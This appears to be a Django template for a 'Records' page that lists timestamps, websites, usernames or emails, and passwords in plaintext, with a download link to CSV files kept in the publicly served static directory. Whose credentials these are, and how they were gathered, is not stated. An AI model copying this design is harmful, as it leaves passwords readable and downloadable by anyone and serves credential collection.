{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="{% static 'images/gne.png' %}" type="image/x-icon">
    <title>Records</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cookie|Lato|Pacifico|Raleway|Merriweather|Passion+One:wght@400;700;900|Roboto+Slab:wght@300;400&display=swap"> -->
    <link rel="stylesheet" href="{% static './Bootstrap/css/bootstrap.css' %}">
    <link rel="stylesheet" href="{% static './Bootstrap/css/bootstrap-grid.css' %}">
    <link rel="stylesheet" href="{% static './Bootstrap/css/bootstrap.min.css' %}">
    <link rel="stylesheet" href="{% static './Bootstrap/css/bootstrap-grid.min.css' %}">
    <link rel="stylesheet" href="{% static './Bootstrap/css/bootstrap-reboot.css' %}">
    <link rel="stylesheet" href="{% static './Bootstrap/css/bootstrap-reboot.min.css' %}">
    <link rel="stylesheet" href="{% static './css/main.css' %}">
</head>
<body>
    <h1 style="text-align: center;margin-top: 15px;"><span style="border-bottom: 3px dashed rgb(150, 150, 150);padding-bottom: 5px;">&nbsp;<span style="border-bottom: 3px dashed rgb(174, 174, 174);">Records</span>&nbsp;</span></h1><br>

    <div class="download-btn">
        {% if info == 'ssdc' %}
        <a href="{% static './data/sddc_data.csv' %}">
        {% elif info == 'ssdg' %}
        <a href="{% static './data/sddg_data.csv' %}">
        {% endif %}
            <button class="btn btn-outline-success bt2" id="save-csv"><i class="fa fa-download"></i>&nbsp; <b>Download</b></button>
        </a>
    </div>

    <div class="table-responsive" style="padding-left: 10px;padding-right: 10px;">
        <table class="table table-bordered" style="text-align: center;">
            <thead>
              <tr style="background-color: rgb(250, 250, 250);">
                <th scope="col">S.No.</th>
                <th scope="col">TimeStamp</th>
                <th scope="col">Website</th>
                {% if info == 'ssdc'%} <th scope="col">Username</th> {% elif info == 'ssdg' %} <th scope="col">Email</th> {% endif %}
                <th scope="col">Password</th>
              </tr>
            </thead>
            <tbody id="ce">
                {% for i in data %}
                <tr><th scope='row'>{{ forloop.counter }}</th><td>{{i.0}}</td><td>{{i.1}}</td><td>{{i.2}}</td><td>{{i.3}}</td></tr> 
                {% endfor %}
            </tbody>
          </table>
        </div>
</body>
<script src="{% static './js/jquery-2.0.0.min.js' %}"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.3.1/jquery.min.js"></script> -->
<script src="{% static '.\Bootstrap\js\bootstrap.js' %}"></script>
<script src="{% static '.\Bootstrap\js\bootstrap.min.js' %}"></script>
<script src="{% static '.\Bootstrap\js\bootstrap.bundle.js' %}"></script>
<script src="{% static '.\Bootstrap\js\bootstrap.bundle.min.js' %}"></script>
<!-- <script src="//code.jquery.com/jquery-1.11.1.min.js"></script> -->
<!-- <script src="{% static './js/jouery-1.11.1.min.js' %}"></script> -->
<script type="text/javascript" src="{% static './js/main.js' %}" async defer></script>
</html>
